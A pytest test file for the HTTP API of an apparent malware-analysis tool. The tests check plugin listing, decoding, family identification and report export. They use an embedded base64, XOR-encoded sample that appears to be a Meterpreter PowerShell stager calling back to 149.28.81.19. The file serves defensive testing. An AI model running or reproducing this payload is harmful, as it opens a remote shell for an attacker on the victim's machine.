"""Phase-D tests · Analyst Workspace v2 API surface.

Locks the customer-facing contract of the new engine's HTTP surface.
"""
from __future__ import annotations
import os

import base64
import json

import pytest
from fastapi.testclient import TestClient


METERPRETER_INNER_B64 = (
    "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfI"
    "vOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIv"
    "BFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMj"
    "IyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyM"
    "R46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3"
    "Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyM"
    "a5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+"
    "VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZ"
    "RDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDF"
    "Q0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9"
    "l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwN"
    "NWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxg"
    "W2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS"
    "6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyM"
    "jIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjI"
    "yMg"
)
FULL_PS_WRAPPER = (
    "[Byte[]]$var_code = [System.Convert]::FromBase64String('" +
    METERPRETER_INNER_B64 + "')"
)


@pytest.fixture(scope="module")
def client():
    import sys
    sys.path.insert(0, "/app/backend")
    from server import app
    with TestClient(app) as c:
        yield c


@pytest.fixture(scope="module")
def token(client):
    r = client.post("/api/auth/login", json={
        "email": "admin@nivxray.com", "password": os.environ.get("ADMIN_PASSWORD", "")
    })
    assert r.status_code == 200
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def hdr(token):
    return {"Authorization": f"Bearer {token}"}


class TestPluginIntrospection:
    def test_lists_all_registered_plugins(self, client, hdr):
        r = client.get("/api/v2/plugins", headers=hdr)
        assert r.status_code == 200
        body = r.json()
        assert body["count"] >= 12
        ids = {p["id"] for p in body["plugins"]}
        for required in ("base64-decode", "xor-brute", "extract-wrapper",
                         "ascii85-decode", "base91-decode"):
            assert required in ids

    def test_plugins_sorted_by_category_and_cost(self, client, hdr):
        r = client.get("/api/v2/plugins", headers=hdr)
        pls = r.json()["plugins"]
        keys = [(p["category"], p["cost"], p["id"]) for p in pls]
        assert keys == sorted(keys)


class TestAnalyzeV2:
    def test_rejects_empty_input(self, client, hdr):
        r = client.post("/api/v2/analyze", headers=hdr, json={"input": ""})
        assert r.status_code == 400

    def test_meterpreter_full_report(self, client, hdr):
        r = client.post("/api/v2/analyze", headers=hdr,
                        json={"input": FULL_PS_WRAPPER})
        assert r.status_code == 200
        rep = r.json()["report"]
        # Core assertions
        assert rep["terminal"] == "family-identified"
        assert rep["findings"]["verdict"] == "malicious"
        assert rep["findings"]["risk_score"] >= 80
        assert "149.28.81.19" in rep["findings"]["iocs"]["ips"]
        # Decoder chain locked — RC2.1a appends confirming family plugin
        chain = [s["decoder"] for s in rep["trace"]]
        assert chain[:3] == ["extract-wrapper", "base64-decode", "xor-brute"]
        assert "family-meterpreter" in chain
        # Confidence breakdown populated
        assert rep["confidence_breakdown"]["contributions"]
        assert rep["confidence_breakdown"]["total"] == rep["findings"]["risk_score"]
        # Plugin execution report populated (RC2.1a intelligence pass adds one
        # additional TraceStep so layers_run is 4 instead of the pre-2.1a 3)
        assert rep["plugin_report"]["layers_run"] == 4
        assert rep["plugin_report"]["entries"]

    def test_budget_overrides_respected(self, client, hdr):
        r = client.post("/api/v2/analyze", headers=hdr, json={
            "input": FULL_PS_WRAPPER,
            "max_depth": 1,
            "wall_time_ms": 3000,
        })
        assert r.status_code == 200
        rep = r.json()["report"]
        # With depth=1 the chain must stop after one layer
        assert len(rep["trace"]) <= 1
        assert rep["terminal"] in ("budget", "complete", "no-candidate")


class TestReportExport:
    def test_markdown_export(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=md", headers=hdr,
                        json={"input": FULL_PS_WRAPPER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/markdown")
        body = r.text
        # All required sections present
        for section in ("# NivXRay Analyst Report", "## Executive Summary",
                        "## Verdict", "### Why This Score", "## Malware Family",
                        "## Decode Timeline", "## Indicators of Compromise",
                        "## MITRE ATT&CK Mapping", "## LOLBAS Detection",
                        "## Recommended Investigation Steps",
                        "## Plugin Execution Report"):
            assert section in body, f"Missing section: {section}"
        # Content assertions
        assert "149.28.81.19" in body
        assert "malicious" in body.lower()
        assert "Meterpreter" in body

    def test_json_export(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=json", headers=hdr,
                        json={"input": FULL_PS_WRAPPER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("application/json")
        data = json.loads(r.text)
        assert data["findings"]["family"]["family"]
        assert data["confidence_breakdown"]["contributions"]

    def test_text_export(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=txt", headers=hdr,
                        json={"input": FULL_PS_WRAPPER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/plain")
        assert "149.28.81.19" in r.text

    def test_invalid_format_rejected(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=xls", headers=hdr,
                        json={"input": FULL_PS_WRAPPER})
        assert r.status_code == 400
